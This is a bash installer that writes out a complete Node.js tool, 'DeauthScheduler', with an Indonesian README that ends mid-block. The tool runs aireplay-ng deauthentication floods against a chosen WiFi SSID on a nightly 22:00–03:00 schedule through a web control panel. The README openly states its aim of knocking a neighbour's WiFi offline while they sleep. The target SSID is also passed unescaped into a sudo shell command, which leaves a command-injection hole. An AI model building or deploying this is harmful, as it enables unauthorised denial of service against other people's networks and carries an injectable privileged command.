#!/bin/bash
# install.sh - DeauthScheduler project generator
# Usage: bash install.sh

echo "Creating project folder structure..."
mkdir -p deauth-scheduler/public
cd deauth-scheduler

# 1. package.json
cat > package.json << 'EOF'
{
  "name": "deauth-scheduler",
  "version": "1.0.0",
  "description": "Web-based deauth attack scheduler",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "postinstall": "echo 'Install complete. Run: npm start'"
  },
  "dependencies": {
    "express": "^4.18.2",
    "node-schedule": "^2.1.1",
    "body-parser": "^1.20.2"
  }
}
EOF

# 2. config.js
cat > config.js << 'EOF'
module.exports = {
  // WiFi interface yang mendukung monitor mode (biasanya wlan0)
  interface: 'wlan0',
  // Default SSID target (bisa diubah via web UI)
  targetSSID: '',
  // Jadwal default (format 24 jam)
  schedule: {
    start: '22:00',   // Mulai deauth jam 10 malam
    stop: '03:00'     // Berhenti jam 3 pagi
  },
  // Interval deauth dalam detik (kirim beacon flood setiap X detik)
  interval: 10,
  // Port web server
  port: 3000
};
EOF

# 3. deauth.js
cat > deauth.js << 'EOF'
const { exec } = require('child_process');
const config = require('./config');

class Deauth {
  constructor(iface, ssid) {
    this.interface = iface || config.interface;
    this.targetSSID = ssid || config.targetSSID;
    this.process = null;
    this.active = false;
  }

  start() {
    if (this.active) return console.log('Deauth already running');
    if (!this.targetSSID) return console.log('No SSID set');

    console.log(`Starting deauth on ${this.targetSSID} via ${this.interface}`);
    // Pastikan interface dalam monitor mode
    exec(`sudo airmon-ng start ${this.interface}`, (err) => {
      if (err) console.error('Monitor mode error:', err.message);
      // Gunakan interface mon0 (atau sesuaikan)
      const monInterface = this.interface + 'mon';
      // Jalankan aireplay-ng deauth flood
      this.process = exec(`sudo aireplay-ng --deauth 0 -e "${this.targetSSID}" ${monInterface}`, 
        (error, stdout, stderr) => {
          if (error) console.error('Deauth error:', error.message);
        });
      this.active = true;
    });
  }

  stop() {
    if (!this.active) return console.log('Deauth not running');
    console.log('Stopping deauth...');
    if (this.process) {
      exec('sudo killall aireplay-ng', (err) => {
        if (err) console.error('Stop error:', err.message);
        // Kembalikan interface ke managed mode
        exec(`sudo airmon-ng stop ${this.interface}mon`);
      });
      this.process = null;
    }
    this.active = false;
  }

  status() {
    return {
      active: this.active,
      target: this.targetSSID,
      interface: this.interface
    };
  }

  updateTarget(ssid) {
    this.targetSSID = ssid;
    if (this.active) {
      this.stop();
      this.start();
    }
  }
}

module.exports = Deauth;
EOF

# 4. scheduler.js
cat > scheduler.js << 'EOF'
const schedule = require('node-schedule');
const config = require('./config');

class Scheduler {
  constructor(deauthInstance) {
    this.deauth = deauthInstance;
    this.job = null;
    this.startTime = config.schedule.start;
    this.stopTime = config.schedule.stop;
    this.setup();
  }

  setup() {
    // Jadwalkan start job
    const startRule = new schedule.RecurrenceRule();
    const [startHour, startMinute] = this.startTime.split(':').map(Number);
    startRule.hour = startHour;
    startRule.minute = startMinute;
    startRule.tz = 'Asia/Jakarta';  // Sesuaikan timezone

    // Jadwalkan stop job
    const stopRule = new schedule.RecurrenceRule();
    const [stopHour, stopMinute] = this.stopTime.split(':').map(Number);
    stopRule.hour = stopHour;
    stopRule.minute = stopMinute;
    stopRule.tz = 'Asia/Jakarta';

    // Hentikan job lama jika ada
    if (this.job) this.job.cancel();

    // Start job
    schedule.scheduleJob('deauth-start', startRule, () => {
      console.log('Scheduler: Starting deauth');
      this.deauth.start();
    });

    // Stop job
    schedule.scheduleJob('deauth-stop', stopRule, () => {
      console.log('Scheduler: Stopping deauth');
      this.deauth.stop();
    });

    console.log(`Deauth scheduled: ${this.startTime} - ${this.stopTime}`);
  }

  updateTimes(start, stop) {
    this.startTime = start;
    this.stopTime = stop;
    this.setup();
  }

  cancelAll() {
    if (this.job) this.job.cancel();
    schedule.cancelJob('deauth-start');
    schedule.cancelJob('deauth-stop');
  }
}

module.exports = Scheduler;
EOF

# 5. server.js
cat > server.js << 'EOF'
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const config = require('./config');
const Deauth = require('./deauth');
const Scheduler = require('./scheduler');

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Inisialisasi Deauth dan Scheduler
const deauth = new Deauth(config.interface, config.targetSSID);
const scheduler = new Scheduler(deauth);

// API endpoints
app.get('/api/status', (req, res) => {
  res.json({
    deauth: deauth.status(),
    schedule: {
      start: scheduler.startTime,
      stop: scheduler.stopTime
    }
  });
});

app.post('/api/start', (req, res) => {
  deauth.start();
  res.json({ success: true, message: 'Deauth started manually' });
});

app.post('/api/stop', (req, res) => {
  deauth.stop();
  res.json({ success: true, message: 'Deauth stopped manually' });
});

app.post('/api/config', (req, res) => {
  const { targetSSID, startTime, stopTime } = req.body;
  if (targetSSID) deauth.updateTarget(targetSSID);
  if (startTime && stopTime) scheduler.updateTimes(startTime, stopTime);
  res.json({ success: true, message: 'Configuration updated' });
});

// Serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(config.port, () => {
  console.log(`DeauthScheduler running at http://localhost:${config.port}`);
});
EOF

# 6. public/index.html
cat > public/index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DeauthScheduler</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1>DeauthScheduler</h1>
    <div class="status-panel">
      <h2>Status</h2>
      <p>Deauth Active: <span id="active-status">Checking...</span></p>
      <p>Target SSID: <span id="target-ssid">-</span></p>
      <p>Interface: <span id="iface">-</span></p>
    </div>
    <div class="schedule-panel">
      <h2>Schedule</h2>
      <p>Start: <span id="start-time"></span></p>
      <p>Stop: <span id="stop-time"></span></p>
    </div>
    <div class="config-panel">
      <h2>Configuration</h2>
      <label>Target SSID:</label>
      <input type="text" id="input-ssid" placeholder="e.g. Tetangga_WiFi">
      <label>Start Time (HH:MM):</label>
      <input type="text" id="input-start" placeholder="22:00" value="22:00">
      <label>Stop Time (HH:MM):</label>
      <input type="text" id="input-stop" placeholder="03:00" value="03:00">
      <button id="btn-update">Update Config</button>
    </div>
    <div class="manual-panel">
      <h2>Manual Control</h2>
      <button id="btn-start">Start Deauth</button>
      <button id="btn-stop">Stop Deauth</button>
    </div>
  </div>
  <script src="script.js"></script>
</body>
</html>
EOF

# 7. public/style.css
cat > public/style.css << 'EOF'
body {
  margin: 0;
  padding: 20px;
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background-color: #0a0a0a;
  color: #e0e0e0;
}
.container {
  max-width: 600px;
  margin: 0 auto;
  background: #1e1e1e;
  padding: 25px;
  border-radius: 8px;
  box-shadow: 0 0 15px rgba(0,255,0,0.1);
}
h1 {
  text-align: center;
  color: #00ff00;
  margin-bottom: 30px;
}
.panel {
  background: #2a2a2a;
  padding: 15px;
  margin-bottom: 20px;
  border-radius: 5px;
}
h2 {
  margin-top: 0;
  color: #00cc00;
}
label {
  display: block;
  margin-top: 10px;
  color: #aaa;
}
input {
  width: 100%;
  padding: 10px;
  margin: 5px 0 15px;
  background: #333;
  border: 1px solid #555;
  color: #fff;
  border-radius: 4px;
}
button {
  padding: 10px 20px;
  margin-right: 10px;
  margin-bottom: 10px;
  background-color: #00aa00;
  border: none;
  color: white;
  border-radius: 4px;
  cursor: pointer;
  transition: background 0.2s;
}
button:hover {
  background-color: #00ff00;
}
button:active {
  background-color: #006600;
}
button:disabled {
  background-color: #555;
  cursor: not-allowed;
}
span {
  font-weight: bold;
  color: #fff;
}
</style>
EOF

# 8. public/script.js
cat > public/script.js << 'EOF'
document.addEventListener('DOMContentLoaded', () => {
  const activeStatus = document.getElementById('active-status');
  const targetSSID = document.getElementById('target-ssid');
  const ifaceEl = document.getElementById('iface');
  const startTimeEl = document.getElementById('start-time');
  const stopTimeEl = document.getElementById('stop-time');
  const inputSSID = document.getElementById('input-ssid');
  const inputStart = document.getElementById('input-start');
  const inputStop = document.getElementById('input-stop');
  const btnUpdate = document.getElementById('btn-update');
  const btnStart = document.getElementById('btn-start');
  const btnStop = document.getElementById('btn-stop');

  function fetchStatus() {
    fetch('/api/status')
      .then(res => res.json())
      .then(data => {
        const d = data.deauth;
        activeStatus.textContent = d.active ? 'Running' : 'Stopped';
        activeStatus.style.color = d.active ? '#00ff00' : '#ff0000';
        targetSSID.textContent = d.target || 'Not set';
        ifaceEl.textContent = d.interface;
        startTimeEl.textContent = data.schedule.start;
        stopTimeEl.textContent = data.schedule.stop;
        inputSSID.value = d.target || '';
        inputStart.value = data.schedule.start;
        inputStop.value = data.schedule.stop;
      })
      .catch(err => console.error('Error fetching status:', err));
  }

  btnUpdate.addEventListener('click', () => {
    const payload = {
      targetSSID: inputSSID.value.trim(),
      startTime: inputStart.value.trim(),
      stopTime: inputStop.value.trim()
    };
    fetch('/api/config', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        alert('Configuration updated!');
        fetchStatus();
      }
    });
  });

  btnStart.addEventListener('click', () => {
    fetch('/api/start', { method: 'POST' })
      .then(res => res.json())
      .then(data => {
        if (data.success) fetchStatus();
      });
  });

  btnStop.addEventListener('click', () => {
    fetch('/api/stop', { method: 'POST' })
      .then(res => res.json())
      .then(data => {
        if (data.success) fetchStatus();
      });
  });

  // Polling status setiap 5 detik
  fetchStatus();
  setInterval(fetchStatus, 5000);
});
EOF

# 9. README.md
cat > README.md << 'EOF'
# DeauthScheduler

Web-based tool untuk menjadwalkan serangan deauthentication pada WiFi target menggunakan aircrack-ng suite. Dibuat untuk membantu Anda tidur nyenyak dengan mengacaukan sinyal WiFi tetangga yang berisik di malam hari.

## Fitur
- Penjadwalan otomatis (jam mulai & berhenti) menggunakan node-schedule.
- Kontrol manual start/stop.
- Konfigurasi SSID target dan jadwal melalui web UI.
- Menggunakan aireplay-ng untuk deauth flood.
- Ringan, bisa dijalankan di Raspberry Pi.

## Persyaratan
- OS Linux (Raspberry Pi OS, Ubuntu, dll.)
- Kartu WiFi yang mendukung **monitor mode** dan **packet injection**.
- Aircrack-ng suite (`sudo apt install aircrack-ng`)
- Node.js v14+ dan npm
- Hak akses sudo untuk mengaktifkan monitor mode dan menjalankan aireplay-ng.

## Instalasi
1. Clone atau download project ini.
2. Jalankan script installer:
   ```bash
   bash install.sh
